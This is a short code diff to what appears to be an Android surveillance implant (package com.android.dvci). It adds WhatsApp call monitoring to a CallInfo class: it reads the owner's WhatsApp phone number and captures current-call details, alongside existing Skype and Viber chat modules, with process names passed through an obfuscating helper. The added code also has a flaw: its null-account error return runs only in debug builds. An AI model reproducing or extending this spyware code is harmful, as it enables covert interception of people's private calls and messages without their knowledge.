@@ -4,6 +4,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.module.chat.ChatSkype;
 import com.android.dvci.module.chat.ChatViber;
+import com.android.dvci.module.chat.ChatWhatsapp;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
@@ -176,6 +177,32 @@ public class CallInfo {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
 			}
+
+			return ret;
+
+		}else if (this.programId == 0x014b) {
+
+			if (end) {
+				return true;
+			}
+			this.processName = M.e("com.whatsapp");
+			// open DB
+			String account = ChatWhatsapp.readMyPhoneNumber();
+			this.account = account;
+			this.delay = false;
+			this.realRate = false;
+
+			if(account == null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (update) ERROR, cannot read whatsapp account ");
+					return false;
+				}
+			}
+			boolean ret = true;
+				ret = ChatWhatsapp.getCurrentCall(this);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " WHATSAPP (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+				}
 
 			return ret;
 
